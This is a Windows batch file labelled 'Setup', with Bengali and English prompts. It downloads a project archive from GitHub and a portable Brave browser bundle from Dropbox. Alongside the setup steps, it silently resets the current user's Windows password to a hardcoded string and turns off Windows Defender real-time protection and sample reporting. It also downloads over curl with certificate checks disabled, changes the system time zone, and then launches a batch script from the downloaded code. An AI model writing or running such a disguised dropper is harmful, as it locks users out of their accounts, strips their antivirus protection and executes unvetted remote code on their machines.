@echo off
setlocal enabledelayedexpansion
title Setup
cd /d "%~dp0"

set "ZIP_URL=https://github.com/mijanurrahmanfs596-wq/B71me/archive/refs/heads/main.zip"
set "BRAVE_URL=https://www.dropbox.com/scl/fi/jjfrwbf867zut4n8ty743/brave.7z?rlkey=meurahb5pmt1qpa6ouh1c0vd5&st=1cjk51no&dl=1"
set "Z=%~dp0main.zip"
set "T=%~dp0_t"
set "D=%USERPROFILE%\Desktop\New folder"
set "B_DIR=%USERPROFILE%\Desktop\brave_extracted"
set "B_7Z=%USERPROFILE%\Desktop\brave.7z"

if "%~1"=="--brave" goto :do_brave

net user %USERNAME% Mijaur+@@ddsfg >nul 2>&1

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Administrator হিসেবে চালান - Run as admin
    pause
    exit /b
)

echo [*] Windows Defender OFF করা হচ্ছে...
powershell -NoProfile -c "Set-MpPreference -DisableRealtimeMonitoring 1 -MAPSReporting 0 -SubmitSamplesConsent 2" >nul 2>&1

if not exist "%D%" md "%D%" >nul 2>&1
start "" /b cmd /c call "%~f0" --brave >nul 2>&1

:prompt_id
set "MACHINE_ID="
set /p "MACHINE_ID=Machine ID: "
if not defined MACHINE_ID goto :prompt_id

echo [*] Downloading project...
curl.exe -s -L -k "%ZIP_URL%" -o "%Z%" || (echo [!] Download failed & pause & exit /b 1)

echo [*] Extracting project...
powershell -NoProfile -c "Expand-Archive '%Z%' '%T%' -Force;Copy-Item '%T%\B71me-main\*' '%D%' -Recurse -Force;Remove-Item '%T%','%Z%' -Recurse -Force" >nul 2>&1
(echo !MACHINE_ID!)> "%D%\machine_id.txt"

tzutil /s "India Standard Time" >nul 2>&1

echo [*] Checking browser...
:wait_brave
if not exist "%B_DIR%\brave-portable.exe" timeout /t 1 /nobreak >nul & goto :wait_brave
if not exist "%B_DIR%\chromedriver.exe" timeout /t 1 /nobreak >nul & goto :wait_brave

if exist "%D%\START_RCV.bat" start "" /d "%D%" "%D%\START_RCV.bat"
exit /b 0

:do_brave
if exist "%B_DIR%\brave-portable.exe" if exist "%B_DIR%\chromedriver.exe" exit /b 0
taskkill /f /im "brave*.exe" /im "chromedriver.exe" >nul 2>&1

set "S7=C:\Program Files\7-Zip\7z.exe"
if not exist "%S7%" set "S7=7z"
where.exe 7z >nul 2>&1 || (
    set "S7=%TEMP%\7zr.exe"
    if not exist "!S7!" curl.exe -s -L -k "https://www.7-zip.org/a/7zr.exe" -o "!S7!"
)

set "BZ_OK=0"
if exist "%B_7Z%" for %%F in ("%B_7Z%") do if %%~zF GEQ 150000000 set "BZ_OK=1"
if "!BZ_OK!"=="0" (
    del /f /q "%B_7Z%" >nul 2>&1
    curl.exe -s -L -k "%BRAVE_URL%" -o "%B_7Z%"
)

if not exist "%B_DIR%" md "%B_DIR%" >nul 2>&1
"%S7%" x "%B_7Z%" -o"%B_DIR%" -y >nul 2>&1
exit /b 0